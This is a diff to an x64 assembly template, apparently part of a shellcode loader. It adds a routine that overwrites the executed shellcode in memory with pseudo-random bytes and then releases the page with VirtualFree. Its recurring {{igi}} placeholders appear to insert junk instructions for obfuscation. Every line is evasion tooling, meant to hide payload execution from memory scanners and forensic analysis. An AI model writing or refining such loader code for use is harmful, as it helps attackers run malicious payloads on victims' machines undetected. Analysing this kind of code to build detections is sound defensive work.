@@ -386,7 +386,6 @@ entry:
     mov rcx, rax                 {{igi}} // hHandle, hThread
     mov rdx, 0xFFFFFFFF          {{igi}} // dwMilliseconds, INFINITE
     mov rax, [rsp+0x30]          {{igi}} // address of WaitForSingleObject
-
     sub rsp, 0x20                {{igi}} // reserve stack for call convention
     call rax                     {{igi}} // call WaitForSingleObject
     add rsp, 0x20                {{igi}} // restore stack for call convention
@@ -404,7 +403,38 @@ entry:
 // =================================== erase shellcode ===================================
 
 {{if .NeedEraseShellcode}}
+  // overwrite memory data
+  mov {{.RegV.rdx}}, [rsp+0x08]                {{igi}} // address of memory page
+  add {{.RegV.rdx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
+  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
+  sub {{.RegV.rcx}}, 7                         {{igi}} // adjust loop times
+  // calculate a random seed from registers
+  add {{.RegV.rax}}, {{.Reg.rbx}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rcx}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rdx}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rsi}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rdi}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.r8}}               {{igi}}
+  add {{.RegV.rax}}, {{.Reg.r9}}               {{igi}}
+  add {{.RegV.rax}}, {{.Reg.r10}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.r11}}              {{igi}}
+ loop_erase:
+  // it will waste some loop but clean code
+  call xor_shift                               {{igi}}
+  mov [{{.RegV.rdx}}], {{.RegV.rax}}           {{igi}}
+  // check erase instruction is finish
+  inc {{.RegV.rdx}}                            {{igi}}
+  dec {{.RegV.rcx}}                            {{igi}}
+  jnz loop_erase                               {{igi}}
 
+  // release allocated memory page
+  mov rax, [rsp+0x18]                          {{igi}} // address of VirtualFree
+  mov rcx, [rsp+0x08]                          {{igi}} // address of allocated memory
+  xor rdx, rdx                                 {{igi}} // dwSize
+  mov r8, 0x8000                               {{igi}} // dwFreeType MEM_RELEASE
+  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
+  call rax                                     {{igi}} // call VirtualFree
+  add rsp, 0x20                                {{igi}} // restore stack for call convention
 {{end}}
 
 // ================================== clean environment ==================================
